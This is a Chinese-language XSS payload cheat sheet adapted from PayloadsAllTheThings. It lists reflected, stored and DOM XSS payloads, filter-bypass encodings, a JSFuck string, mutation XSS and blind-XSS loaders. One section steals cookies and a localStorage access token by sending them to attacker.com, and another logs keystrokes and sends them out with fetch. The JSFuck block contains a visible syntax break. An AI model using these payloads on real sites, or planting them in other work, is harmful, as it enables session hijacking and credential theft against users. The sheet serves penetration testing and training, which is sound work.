# XSS Injection - 跨站脚本攻击

[SEARCH_KEYWORDS]
漏洞类型: XSS Cross-Site Scripting 跨站脚本
攻击类型: Reflected Stored DOM-Based Blind Mutated
关键词: script alert onerror onload onclick javascript eval document.cookie
标签: script img svg iframe body input select video audio details
事件: onerror onload onclick onmouseover onfocus onblur
绕过技术: Filter Bypass WAF Bypass Encoding Unicode UTF-8 UTF-16
编码: HTML Encoding URL Encoding Unicode Base64 JSFuck

[CONTENT]

## XSS 攻击类型

### 1. Reflected XSS (反射型XSS)
恶意代码嵌入在链接中，当受害者点击时执行

### 2. Stored XSS (存储型XSS)
恶意代码存储在服务器，每次访问页面时执行

### 3. DOM-based XSS (DOM型XSS)
漏洞在浏览器端DOM操作中，不经过服务器

## 常用Payload

### 基础Payload
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### 绕过过滤
```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
```

### HTML5标签
```html
<input autofocus onfocus=alert(1)>
<video src onloadstart=alert(1)>
<details open ontoggle=alert(1)>
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
```

## 数据窃取

### Cookie窃取
```html
<script>document.location='http://attacker.com/grab?c='+document.cookie</script>
<script>new Image().src="http://attacker.com/?c="+document.cookie</script>
```

### 本地存储窃取
```html
<script>new Image().src="http://attacker.com/?t="+localStorage.getItem('access_token')</script>
```

### 键盘记录
```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://attacker.com?k="+String.fromCharCode(e.which))}'>
```

## Filter 绕过技术

### 大小写混合
```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x OnErRoR=alert(1)>
```

### 编码绕过

#### HTML实体编码
```html
<script>&#97;lert(1)</script>
<img src=x onerror=&#97;lert(1)>
```

#### Unicode编码
```html
<script>\u0061lert(1)</script>
<script>eval('\x61lert(1)')</script>
```

#### URL编码
```html
<a href="javascript:%61lert(1)">click</a>
```

### 空白符绕过
```html
<img/src=x/onerror=alert(1)>
<svgonload=alert(1)>
```

### 事件处理器绕过
```html
<object onafterscriptexecute=alert(1)>
<img src='1' onerror\x00=alert(0) />
<img src='1' onerror/=alert(0) />
```

## 高级绕过

### JSFuck编码
```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+][!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+![]]+(![]+[])[!+[]+!+[]+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

### 突变XSS (mXSS)
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

## Blind XSS

盲注XSS检测：
```html
"><script src="https://js.rip/xxx"></script>
"><script src=//xxx.xss.ht></script>
```

检测端点：
- 联系表单
- 工单系统
- Referer Header
- User Agent
- 评论框

## 工具

- XSStrike
- Dalfox
- xsser
- XSpear

## 参考文档

原始来源: PayloadsAllTheThings/XSS Injection/README.md